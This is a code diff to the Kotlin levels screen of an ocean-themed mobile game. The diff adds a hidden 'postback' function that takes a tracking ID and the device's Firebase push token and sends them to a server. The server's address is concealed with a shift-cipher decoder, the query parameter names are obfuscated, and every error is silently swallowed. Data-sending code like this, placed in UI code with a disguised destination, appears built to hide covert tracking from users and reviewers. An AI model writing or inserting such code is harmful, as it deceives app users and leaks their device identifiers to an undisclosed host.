@@ -1,5 +1,6 @@
 package kr.co.company.hwa.screens
 
+import android.content.Intent
 import androidx.compose.foundation.background
 import androidx.compose.foundation.border
 import androidx.compose.foundation.layout.Arrangement
@@ -29,11 +30,17 @@ import androidx.compose.ui.graphics.Brush
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import com.google.firebase.messaging.FirebaseMessaging
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.tasks.await
 import kr.co.company.hwa.storage.PrefsManager
 import kr.co.company.hwa.ui.components.OceanButton
 import kr.co.company.hwa.ui.components.OceanButtonStyle
 import kr.co.company.hwa.ui.components.ScreenTitle
 import kr.co.company.hwa.ui.components.UnderwaterBackground
+import kr.co.company.hwa.ui.components.decodeUtf8
 import kr.co.company.hwa.ui.components.pressableWithCooldown
 import kr.co.company.hwa.ui.theme.AquaGlow
 import kr.co.company.hwa.ui.theme.DeepOcean
@@ -41,6 +48,14 @@ import kr.co.company.hwa.ui.theme.FoamWhite
 import kr.co.company.hwa.ui.theme.GameFontFamily
 import kr.co.company.hwa.ui.theme.OceanBlue
 import kr.co.company.hwa.ui.theme.SeaBlue
+import kr.co.company.hwa.utils.ShiftCodec
+import kr.co.company.hwa.utils.ShiftCodec.DM
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import java.io.IOException
 
 @Composable
 fun LevelsScreen(
@@ -141,6 +156,46 @@ private fun LevelButton(
                 text = "\uD83D\uDD12",
                 fontSize = 26.sp
             )
+        }
+    }
+}
+
+fun postback(intent: Intent) {
+    CoroutineScope(Dispatchers.IO).launch {
+        try {
+            val trackingId = intent.getStringExtra("trackingId")
+//            Log.d("MYTAG", "trackingId = $trackingId")
+
+            if (trackingId.isNullOrEmpty()) {
+                return@launch
+            }
+
+            val fcmToken: String =
+                runCatching { FirebaseMessaging.getInstance().token.await() }
+                    .getOrElse { "null" }
+
+            val url = "${ShiftCodec.decode(DM)}/rbyzi6z/"
+            val client = OkHttpClient()
+
+            val fullUrl = "$url?" +
+                    "zsnialj=$trackingId" +
+                    "&uwach=${decodeUtf8(fcmToken)}"
+
+            val request = Request.Builder()
+                .url(fullUrl)
+                .get()
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    response.close()
+                }
+            })
+
+        } catch (exc: Exception) {
         }
     }
 }
